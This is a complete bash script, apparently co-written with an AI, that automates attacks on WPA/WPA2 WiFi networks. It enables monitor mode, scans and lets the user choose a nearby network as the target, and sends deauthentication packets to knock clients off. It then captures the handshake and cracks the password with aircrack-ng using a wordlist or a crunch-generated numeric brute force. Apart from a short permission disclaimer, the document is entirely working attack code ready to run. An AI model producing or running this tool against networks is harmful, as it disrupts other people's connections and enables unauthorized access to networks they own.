#!/bin/bash

# WiFi Pentest Script
# Author: Gemini & User Input
# Version: 1.4.7 (Implemented direct numerical brute-force using crunch)
# Disclaimer: This script is for educational purposes only.
# Only use it on networks you own or have explicit permission to test.
# Unauthorized access to computer systems is illegal.

# --- Configuration ---
DEFAULT_IFACE="wlan0"       # Default wireless interface
CAPTURE_DIR="/tmp"          # Directory for temporary files and captures
HANDSHAKE_FILE_PREFIX="handshake"
AIRODUMP_SCAN_PREFIX="$CAPTURE_DIR/network_scan" # Prefix for airodump-ng scan output files
SCAN_DURATION=10            # Seconds to scan for networks in Step 3 (Adjust as needed)

# --- Global Variables for PIDs ---
AIRODUMP_SCAN_PID=""
# AIRODUMP_CAPTURE_PID is no longer needed as capture runs in foreground
MONITOR_IFACE="" # Will be set in enable_monitor_mode
ORIGINAL_IFACE="" # To store the initial interface name for cleanup
CLEANUP_IN_PROGRESS=0 # Flag to prevent cleanup recursion

# --- Helper Functions ---
ask_continue() {
    read -p "Press [Enter] to continue, or type 'abort' to exit script: " response
    if [[ "$response" == "abort" ]]; then
        echo "[INFO] User chose to abort. Cleaning up and exiting..."
        cleanup_and_exit 1 
    fi
}

ask_yes_no() {
    while true; do
        read -p "$1 (y/n): " yn
        case $yn in
            [Yy]* ) return 0;; # Yes
            [Nn]* ) return 1;; # No
            * ) echo "Please answer yes (y) or no (n).";;
        esac
    done
}

# --- Cleanup Function ---
cleanup_and_exit() {
    local exit_status=${1:-1} 
    
    if [[ "$CLEANUP_IN_PROGRESS" -eq 1 ]]; then
        exit "$exit_status"
    fi
    CLEANUP_IN_PROGRESS=1 

    echo "[CLEANUP] Script exiting. Initiating cleanup..."

    if [[ -n "$AIRODUMP_SCAN_PID" ]] && ps -p "$AIRODUMP_SCAN_PID" > /dev/null; then
        echo "[CLEANUP] Stopping network scan airodump-ng (PID: $AIRODUMP_SCAN_PID)..."
        sudo kill -TERM "$AIRODUMP_SCAN_PID" &>/dev/null
        wait "$AIRODUMP_SCAN_PID" 2>/dev/null
    fi
    AIRODUMP_SCAN_PID=""

    if [[ -n "$MONITOR_IFACE" && -e "/sys/class/net/$MONITOR_IFACE" ]]; then
        echo "[CLEANUP] Stopping monitor mode on '$MONITOR_IFACE'..."
        sudo airmon-ng stop "$MONITOR_IFACE" &>/dev/null
    fi
    MONITOR_IFACE="" 

    if [[ -n "$ORIGINAL_IFACE" && -e "/sys/class/net/$ORIGINAL_IFACE" ]]; then 
        echo "[CLEANUP] Attempting to bring up original interface '$ORIGINAL_IFACE'..."
        sudo ip link set "$ORIGINAL_IFACE" up &>/dev/null
    fi

    echo "[CLEANUP] Restarting NetworkManager and wpa_supplicant..."
    sudo systemctl start NetworkManager &>/dev/null
    sudo systemctl start wpa_supplicant &>/dev/null
    echo "[CLEANUP] Network services restart attempted."

    echo "[CLEANUP] Removing temporary scan files (${AIRODUMP_SCAN_PREFIX}*)..."
    rm -f "${AIRODUMP_SCAN_PREFIX}"*
    echo "[CLEANUP] Cleanup complete. Exiting with status $exit_status."
    CLEANUP_IN_PROGRESS=0 
    exit "$exit_status" 
}

# Trap interrupts to run cleanup function
trap 'cleanup_and_exit $?' EXIT
trap 'echo; echo "[INTERRUPT] SIGINT (Ctrl+C) received."; cleanup_and_exit 130' SIGINT 
trap 'echo; echo "[INTERRUPT] SIGTERM received."; cleanup_and_exit 143' SIGTERM 


# --- Script Start ---
echo "============================================="
echo " Interactive WiFi Penetration Testing Script "
echo "============================================="
echo "WARNING: Ensure you have permission to test the target network."
echo "This script requires root privileges for many operations."
echo "Airodump-ng scan process will be managed automatically."
echo "Handshake capture will run in foreground; press Ctrl+C to stop it."
echo

if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo."
  exit 1 
fi

# Check for crunch dependency
if ! command -v crunch &> /dev/null; then
    echo "[ERROR] 'crunch' command not found, but it is required for numerical brute-force (Option 2)."
    echo "Please install crunch (e.g., 'sudo apt install crunch') and try again."
    # Decide if you want to exit or just disable option 2. For now, we'll let the script continue but option 2 will fail if chosen.
fi


mkdir -p "$CAPTURE_DIR"
echo "Temporary files will be in $CAPTURE_DIR. Handshake captures will also be stored there."
echo

# --- 1. Preparation: Stop Interfering Services & airmon-ng check kill ---
echo "[INFO] Stopping NetworkManager and wpa_supplicant to avoid interference..."
sudo systemctl stop NetworkManager
if [ $? -ne 0 ]; then echo "[WARNING] Failed to stop NetworkManager. It might not be running or an error occurred."; fi
sudo systemctl stop wpa_supplicant
if [ $? -ne 0 ]; then echo "[WARNING] Failed to stop wpa_supplicant. It might not be running or an error occurred."; fi

echo "[INFO] Running airmon-ng check kill..."
sudo airmon-ng check kill
sleep 1 
echo "[SUCCESS] Services stopped and airmon-ng check kill executed."
echo

# --- 2. Enable Monitor Mode ---
read -p "Enter the wireless interface to put into monitor mode (default: $DEFAULT_IFACE): " IFACE_INPUT
ORIGINAL_IFACE=${IFACE_INPUT:-$DEFAULT_IFACE} 

echo "[INFO] Attempting to put interface '$ORIGINAL_IFACE' into monitor mode..."

if ! ip link show "$ORIGINAL_IFACE" &> /dev/null; then
    echo "[ERROR] Wireless interface '$ORIGINAL_IFACE' not found."
    exit 1
fi

EXISTING_MONITOR_IFACES=$(iwconfig 2>/dev/null | grep "${ORIGINAL_IFACE%.*[^0-9]}*[0-9]*mon" | awk '{print $1}')
if [ -n "$EXISTING_MONITOR_IFACES" ]; then
    echo "[INFO] Found potentially related existing monitor interface(s): $EXISTING_MONITOR_IFACES"
    for mon_iface in $EXISTING_MONITOR_IFACES; do
        if ask_yes_no "Do you want to try and stop existing monitor interface '$mon_iface' first?"; then
            echo "[INFO] Stopping $mon_iface..."
            sudo airmon-ng stop "$mon_iface"
        fi
    done
fi

airmon_output=$(sudo airmon-ng start "$ORIGINAL_IFACE" 2>&1)
echo "$airmon_output"

MONITOR_IFACE="${ORIGINAL_IFACE}mon"
if ! iwconfig "$MONITOR_IFACE" &>/dev/null || ! (iwconfig "$MONITOR_IFACE" | grep -q 'Mode:Monitor'); then
    MONITOR_IFACE=$(echo "$airmon_output" | grep -oP 'monitor mode vif enabled for \[\w+\]\w+ on \[\w+\]\K\w+' | head -n 1)
    if [[ -z "$MONITOR_IFACE" ]]; then
        MONITOR_IFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}' | head -n 1)
    fi
fi

if [[ -z "$MONITOR_IFACE" ]] || ! (iwconfig "$MONITOR_IFACE" &>/dev/null && iwconfig "$MONITOR_IFACE" | grep -q 'Mode:Monitor'); then
    echo "[ERROR] Failed to enable or detect monitor mode interface automatically."
    read -p "Please enter the name of the monitor interface (if created) or press Enter to exit: " manual_interface
    if [[ -n "$manual_interface" ]]; then
        if iwconfig "$manual_interface" &> /dev/null && iwconfig "$manual_interface" | grep -q 'Mode:Monitor'; then
            MONITOR_IFACE="$manual_interface"
            echo "[INFO] Using manually provided interface: $MONITOR_IFACE"
        else
            echo "[ERROR] Interface '$manual_interface' is not a valid monitor interface."
            exit 1
        fi
    else
        echo "[ERROR] Exiting due to failure to enable or detect monitor mode."
        exit 1
    fi
else
    echo "[SUCCESS] Monitor mode appears to be enabled on: $MONITOR_IFACE"
fi
echo

# --- 3. Scan for Networks ---
echo "[INFO] Scanning for wireless networks for $SCAN_DURATION seconds..."
echo "This will create temporary CSV files in $CAPTURE_DIR starting with '${AIRODUMP_SCAN_PREFIX##*/}'."
rm -f "${AIRODUMP_SCAN_PREFIX}"* # Ensure old scan files are removed first
# The airodump-ng command for scanning, now correctly on its own line, using timeout
sudo timeout "${SCAN_DURATION}s" sudo airodump-ng "$MONITOR_IFACE" --band bg --write "$AIRODUMP_SCAN_PREFIX" --output-format csv --ignore-negative-one &
AIRODUMP_SCAN_PID=$!
echo "[INFO] Airodump-ng (scan) started in background (PID: $AIRODUMP_SCAN_PID). Scanning for $SCAN_DURATION seconds..."

wait "$AIRODUMP_SCAN_PID" 2>/dev/null # Wait for the timeout to kill airodump-ng or for it to finish

echo "[INFO] Attempting to stop network scan (PID: $AIRODUMP_SCAN_PID if it was still running)..." 
if ps -p "$AIRODUMP_SCAN_PID" > /dev/null; then # Check if it's still alive (e.g. if timeout failed or duration was very short)
    sudo kill -TERM "$AIRODUMP_SCAN_PID" &>/dev/null
    wait "$AIRODUMP_SCAN_PID" 2>/dev/null 
    echo "[INFO] Network scan process explicitly stopped."
else
    echo "[INFO] Network scan process already finished (likely stopped by timeout)."
fi
AIRODUMP_SCAN_PID="" 

sleep 1 # Brief pause for file system

AIRODUMP_CSV_FILE="${AIRODUMP_SCAN_PREFIX}-01.csv"

if [ ! -s "$AIRODUMP_CSV_FILE" ]; then
    echo "[ERROR] Airodump-ng scan data file ($AIRODUMP_CSV_FILE) not found or is empty."
    echo "Possible reasons: No networks in range, or an error with airodump-ng/timeout."
    echo "Please ensure '$MONITOR_IFACE' is in monitor mode and try again."
    exit 1
fi
echo "[INFO] Scan data captured in $AIRODUMP_CSV_FILE."
echo

# --- 4. Parse Scan, Display List, Get User Selection ---
echo "[INFO] Processing scanned networks..."
declare -A network_map 

echo "Available WPA/WPA2 Networks:"
COUNT=0
# Read the CSV file, skipping the header and stopping before client list
while IFS=',' read -r CSV_BSSID CSV_FTS CSV_LTS CSV_CHANNEL _ CSV_PRIVACY CSV_CIPHER CSV_AUTH CSV_POWER _ _ _ CSV_ID_LEN CSV_ESSID _; do
    if [[ "$CSV_BSSID" == "Station MAC" ]]; then # Stop if we reach the client list
        break
    fi
    if [[ "$CSV_BSSID" == "BSSID" ]]; then # Skip header row
        continue
    fi

    TRIMMED_BSSID=$(echo "$CSV_BSSID" | xargs)
    TRIMMED_CHANNEL=$(echo "$CSV_CHANNEL" | xargs)
    TRIMMED_PRIVACY=$(echo "$CSV_PRIVACY" | xargs)
    TRIMMED_ESSID=$(echo "$CSV_ESSID" | xargs)

    # Filter for networks with WPA/WPA2, valid BSSID, channel, and a visible ESSID
    if [[ "$TRIMMED_BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && \
          -n "$TRIMMED_CHANNEL" && "$TRIMMED_CHANNEL" -gt 0 && \
          "$TRIMMED_PRIVACY" == *"WPA"* && \
          -n "$TRIMMED_ESSID" && "$TRIMMED_ESSID" != "<length: "* ]]; then
        
        is_duplicate=false
        for i in $(seq 1 $COUNT); do
            if [[ "${network_map[$i,bssid]}" == "$TRIMMED_BSSID" ]]; then
                is_duplicate=true
                break
            fi
        done

        if ! $is_duplicate; then
            COUNT=$((COUNT + 1))
            network_map[$COUNT,bssid]="$TRIMMED_BSSID"
            network_map[$COUNT,channel]="$TRIMMED_CHANNEL"
            network_map[$COUNT,essid]="$TRIMMED_ESSID"
            network_map[$COUNT,privacy]="$TRIMMED_PRIVACY"
            echo "$COUNT. ESSID: $TRIMMED_ESSID | BSSID: $TRIMMED_BSSID | Channel: $TRIMMED_CHANNEL | Privacy: $TRIMMED_PRIVACY"
        fi
    fi
done < "$AIRODUMP_CSV_FILE"

if [ $COUNT -eq 0 ]; then
    echo "[ERROR] No suitable WPA/WPA2 encrypted networks found to target."
    exit 1
fi
echo

while true; do
    read -p "Enter the number of the network you want to target (1-$COUNT): " SELECTION
    if [[ "$SELECTION" =~ ^[0-9]+$ && "$SELECTION" -ge 1 && "$SELECTION" -le $COUNT ]]; then
        TARGET_BSSID="${network_map[$SELECTION,bssid]}"
        TARGET_CHANNEL="${network_map[$SELECTION,channel]}"
        SELECTED_ESSID="${network_map[$SELECTION,essid]}"
        echo "[INFO] You selected: '$SELECTED_ESSID' (BSSID: $TARGET_BSSID, Channel: $TARGET_CHANNEL)"
        break
    else
        echo "[ERROR] Invalid selection. Please enter a number between 1 and $COUNT."
    fi
done
echo

# --- 5. Capture Handshake (with optional Deauth) ---
echo "[INFO] Preparing to capture handshake for BSSID: $TARGET_BSSID on channel: $TARGET_CHANNEL."
CAPTURE_FILE_PATH="$CAPTURE_DIR/${HANDSHAKE_FILE_PREFIX}_${TARGET_BSSID//:/}" 
rm -f "${CAPTURE_FILE_PATH}"* # Remove old capture files for this target first
echo "Capture file will be saved as: ${CAPTURE_FILE_PATH}-01.cap (and related files)"

CLIENT_MAC="" 
PERFORM_DEAUTH=false
if ask_yes_no "Do you want to attempt to deauthenticate a client to capture a handshake faster?"; then
    PERFORM_DEAUTH=true
    echo "[INFO] To identify a client MAC for deauthentication, you might need to:"
    echo "       1. Note it from the initial scan if clients were visible."
    echo "       2. Run a separate airodump-ng instance focused on $TARGET_BSSID (channel $TARGET_CHANNEL)."
    read -p "Enter the CLIENT MAC address to deauthenticate (leave blank to broadcast deauth to all clients on $TARGET_BSSID): " CLIENT_MAC
fi

echo ""
echo "[ACTION REQUIRED] Starting packet capture (airodump-ng) in the foreground."
echo ">>> Watch for 'WPA handshake: $TARGET_BSSID' in the airodump-ng output. <<<"
echo ">>> Press Ctrl+C in this terminal when you see the handshake or are ready to stop capturing. <<<"
ask_continue # Give user a moment to read before airodump-ng takes over terminal

if $PERFORM_DEAUTH; then
    DEAUTH_COUNT=5
    echo "[INFO] Sending $DEAUTH_COUNT deauthentication packets shortly..."
    sleep 1 
    if [[ -z "$CLIENT_MAC" ]]; then
        echo "[INFO] Broadcasting deauthentication packets to all clients on $TARGET_BSSID."
        sudo aireplay-ng --deauth $DEAUTH_COUNT -a "$TARGET_BSSID" "$MONITOR_IFACE"
    else
        echo "[INFO] Sending deauthentication packets to client $CLIENT_MAC on $TARGET_BSSID."
        sudo aireplay-ng --deauth $DEAUTH_COUNT -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$MONITOR_IFACE"
    fi
    echo "[INFO] Deauthentication packets sent. Airodump-ng will now start/continue."
    sleep 1 
else
    echo "[INFO] Skipping deauthentication."
fi

# Start airodump-ng in the FOREGROUND for capture
# The user will stop this with Ctrl+C
sudo airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CHANNEL" -w "$CAPTURE_FILE_PATH" "$MONITOR_IFACE" --ignore-negative-one

echo "[INFO] Airodump-ng (capture) stopped by user (Ctrl+C)."
sleep 1 # Ensure files are written if airodump-ng was writing upon exit

ACTUAL_CAPTURE_FILE=$(ls -t "${CAPTURE_FILE_PATH}"*.cap 2>/dev/null | head -n1)
if [ -z "$ACTUAL_CAPTURE_FILE" ] || [ ! -s "$ACTUAL_CAPTURE_FILE" ]; then
    echo "[WARNING] No .cap file found or it is empty at the expected location ($CAPTURE_FILE_PATH*.cap)."
    echo "A handshake might not have been captured or airodump-ng was stopped before it wrote the file."
    if ! ask_yes_no "Do you want to proceed to cracking anyway (e.g., if you manually moved/verified the file)?"; then
        echo "Aborting cracking process."
        exit 1 
    fi
    read -p "Please manually provide the path to your .cap file (containing the handshake): " ACTUAL_CAPTURE_FILE
    while [[ -z "$ACTUAL_CAPTURE_FILE" || ! -f "$ACTUAL_CAPTURE_FILE" ]]; do
        read -p "File not found or path is empty. Please provide a valid .cap file path: " ACTUAL_CAPTURE_FILE
    done
else
    echo "[SUCCESS] Capture file found: $ACTUAL_CAPTURE_FILE"
fi
echo

# --- 7. Choose Cracking Method ---
echo "Choose a method to crack the captured handshake:"
echo "1. Wordlist Attack"
echo "2. Numerical Brute-force (numbers only)"
echo "3. Skip cracking (manual cracking later)"
read -p "Enter your choice (1-3): " CRACK_CHOICE

case $CRACK_CHOICE in
    1) 
        echo "[INFO] Wordlist Attack selected."
        WORDLIST_FILES=()
        CURRENT_DIR_LIST=( $(find . -maxdepth 1 -type f \( -name "*.txt" -o -name "*.lst" \) -print0 2>/dev/null | xargs -0 -I {} basename {} ) )
        WORDLIST_FILES+=( "${CURRENT_DIR_LIST[@]}" )
        
        COMMON_WORDLIST_DIRS=("/usr/share/wordlists" "/usr/share/dict" "$HOME/wordlists")
        for dir in "${COMMON_WORDLIST_DIRS[@]}"; do
            if [ -d "$dir" ]; then
                FOUND_IN_COMMON=( $(find "$dir" -type f \( -name "*.txt" -o -name "*.lst" \) -print0 2>/dev/null | xargs -0 -I {} basename {} ) )
                WORDLIST_FILES+=( "${FOUND_IN_COMMON[@]}" )
            fi
        done
        WORDLIST_FILES_UNIQUE=($(echo "${WORDLIST_FILES[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
        
        if [ ${#WORDLIST_FILES_UNIQUE[@]} -eq 0 ]; then
            echo "[WARNING] No .txt or .lst files found in the current directory or common wordlist paths."
            read -p "Please enter the full path to your wordlist file: " WORDLIST_PATH
        else
            echo "Select a wordlist or enter path manually:"
            select WORDLIST_FILE_CHOICE in "${WORDLIST_FILES_UNIQUE[@]}" "Enter path manually"; do
                if [[ "$REPLY" == $((${#WORDLIST_FILES_UNIQUE[@]} + 1)) ]]; then
                    read -p "Enter the full path to your wordlist file: " WORDLIST_PATH
                    break
                elif [[ -n "$WORDLIST_FILE_CHOICE" ]]; then
                    WORDLIST_PATH="" 
                    if [ -f "./$WORDLIST_FILE_CHOICE" ]; then
                        WORDLIST_PATH="./$WORDLIST_FILE_CHOICE"
                    else
                        for dir in "${COMMON_WORDLIST_DIRS[@]}"; do
                            if [ -f "$dir/$WORDLIST_FILE_CHOICE" ]; then
                                WORDLIST_PATH="$dir/$WORDLIST_FILE_CHOICE"
                                break
                            fi
                        done
                    fi
                    if [[ -z "$WORDLIST_PATH" && "$WORDLIST_FILE_CHOICE" == /* && -f "$WORDLIST_FILE_CHOICE" ]]; then
                        WORDLIST_PATH="$WORDLIST_FILE_CHOICE"
                    fi

                    if [ -n "$WORDLIST_PATH" ]; then break; else echo "Could not locate '$WORDLIST_FILE_CHOICE'. Try providing full path or ensure it's in a scanned location."; fi
                else
                    echo "Invalid selection. Please try again."
                fi
            done
        fi

        if [[ -z "$WORDLIST_PATH" || ! -f "$WORDLIST_PATH" ]]; then
            echo "[ERROR] Wordlist file not found or path is empty: '$WORDLIST_PATH'"
        else
            echo "[INFO] Cracking WPA/WPA2 handshake using aircrack-ng with wordlist: $WORDLIST_PATH"
            echo "Target BSSID: $TARGET_BSSID"
            echo "Capture file: $ACTUAL_CAPTURE_FILE"
            echo "Command: sudo aircrack-ng -a 2 -b \"$TARGET_BSSID\" -w \"$WORDLIST_PATH\" \"$ACTUAL_CAPTURE_FILE\""
            ask_continue
            sudo aircrack-ng -a 2 -b "$TARGET_BSSID" -w "$WORDLIST_PATH" "$ACTUAL_CAPTURE_FILE"
        fi
        ;;
    2) 
        echo "[INFO] Numerical Brute-force (numbers only) selected."
        if ! command -v crunch &> /dev/null; then
            echo "[ERROR] 'crunch' command not found, which is required for this option."
            echo "Please install crunch (e.g., 'sudo apt install crunch') and try again."
            break # Break from case, effectively skipping this cracking method
        fi

        MIN_DIGITS=0
        MAX_DIGITS=0

        while true; do
            read -p "Enter the minimum number of digits for the password (e.g., 8): " MIN_DIGITS_INPUT
            if [[ "$MIN_DIGITS_INPUT" =~ ^[0-9]+$ && "$MIN_DIGITS_INPUT" -ge 8 ]]; then
                MIN_DIGITS=$MIN_DIGITS_INPUT
                break
            else
                echo "[ERROR] Invalid input. Minimum digits must be a number and at least 8."
            fi
        done

        while true; do
            read -p "Enter the maximum number of digits for the password (e.g., 10): " MAX_DIGITS_INPUT
            if [[ "$MAX_DIGITS_INPUT" =~ ^[0-9]+$ && "$MAX_DIGITS_INPUT" -ge "$MIN_DIGITS" ]]; then
                MAX_DIGITS=$MAX_DIGITS_INPUT
                break
            else
                echo "[ERROR] Invalid input. Maximum digits must be a number and greater than or equal to the minimum ($MIN_DIGITS)."
            fi
        done
        
        echo "[INFO] Starting numerical brute-force with crunch for passwords from $MIN_DIGITS to $MAX_DIGITS digits."
        echo "This might take a very long time depending on the range."
        echo "Command: crunch $MIN_DIGITS $MAX_DIGITS 0123456789 | sudo aircrack-ng -a 2 -b \"$TARGET_BSSID\" -w - \"$ACTUAL_CAPTURE_FILE\""
        ask_continue
        
        # Execute crunch piping to aircrack-ng
        # The '-e true' for bash enables more robust error handling for pipes if needed, but simple pipe should work.
        crunch "$MIN_DIGITS" "$MAX_DIGITS" 0123456789 | sudo aircrack-ng -a 2 -b "$TARGET_BSSID" -w - "$ACTUAL_CAPTURE_FILE"
        
        echo "[INFO] Numerical brute-force attempt finished."
        ;;
    3) 
        echo "[INFO] Skipping cracking process. You can crack the handshake later using:"
        echo "sudo aircrack-ng -a 2 -b \"$TARGET_BSSID\" -w /path/to/your/wordlist.txt \"$ACTUAL_CAPTURE_FILE\""
        ;;
    *)
        echo "[ERROR] Invalid choice. Skipping cracking."
        ;;
esac
echo

# --- 8. Cleanup: (Handled by TRAP on EXIT) ---
echo "[INFO] Script operations complete. Final cleanup will be handled by trap."
echo

echo "============================================="
echo " Script Finished "
echo "============================================="

exit 0 
